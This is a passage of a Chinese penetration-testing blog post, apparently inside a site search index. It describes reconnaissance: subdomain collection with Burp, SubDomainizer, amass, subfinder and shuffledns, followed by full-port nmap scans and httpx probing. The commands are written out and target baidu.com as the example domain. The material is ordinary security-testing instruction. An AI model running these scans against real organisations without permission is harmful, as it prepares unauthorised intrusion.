src="https://img-blog.csdnimg.cn/20210122181243476.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>从以上两步操作后，我们可以对获取的子域名进行第二次爬虫，当然，逆向结果尽可能多点，可以多爬几次。<br>第三步，导出子域名<br>“Engagement Tools” -&gt; “Analyze target” -&gt; 保存为html文件 -&gt; 从html文件中复制出我们的host。<br>我们还可以从爬行的js文件中获取子域名，具体操作步骤如下：</p><p>将所有的链接复制到js.txt中，筛选处js文件：</p><pre><code>cat js.txt | grep ‘\.js’</code></pre><p>利用<a href="https://github.com/nsonaniya2010/SubDomainizer">SubDomainizer</a>来获取js文件中的子域名。</p><p>2、从api接口获取子域名</p><p>互联网上有很多能够查询域信息的网站，如crt.sh，DNSDB，virustotal，sslmate等网站，我们可以利用这些网站来收集更多的子域名，我经常使用的是以下两款个人感觉好用的工具：</p><ul><li>利用amass查找子域名：</li></ul><pre><code>amass enum --passive -d baidu.com</code></pre><ul><li>利用subfinder来查询子域名：<pre><code>echo baidu.com | subfinder</code></pre></li></ul><p>3、基于字典的子域名枚举</p><p>基于字典的子域名枚举的工具有很多，以下是我经常使用的工具:</p><ul><li>使用amass爆破子域名：<pre><code>amass enum -brute -d baidu.com -w ~/Desktop/tool/fuzz/dns/sub_small.txt</code></pre></li><li>使用shuffledns爆破子域名：<pre><code>shuffledns -d baidu.com -r ~/tools/massdns/lists/resolvers.txt -w ~/Desktop/tool/fuzz/dns/sub_small.txt</code></pre><h1 id="五、端口扫描"><a href="#五、端口扫描" class="headerlink" title="五、端口扫描"></a>五、端口扫描</h1>1、利用nmap对前面收集的子域名进行全端口的扫描：</li></ul><pre><code>nmap -sV -sS -iL sub.txt --open -p- -T4 -oX result.xml</code></pre><p>2、解析nmap扫描结果，对于最终的扫描结果，我们需要解析获取相应的数据。</p><p>3、对于开启web端口的我们需要获取标题，状态码等信息，我们可以使用<a href="https://github.com/projectdiscovery/httpx">httpx</a>来达到这个目的。</p><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>以上便是我对企业资产进行收集的全过程，有不足的部分还要请各位师傅请教。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
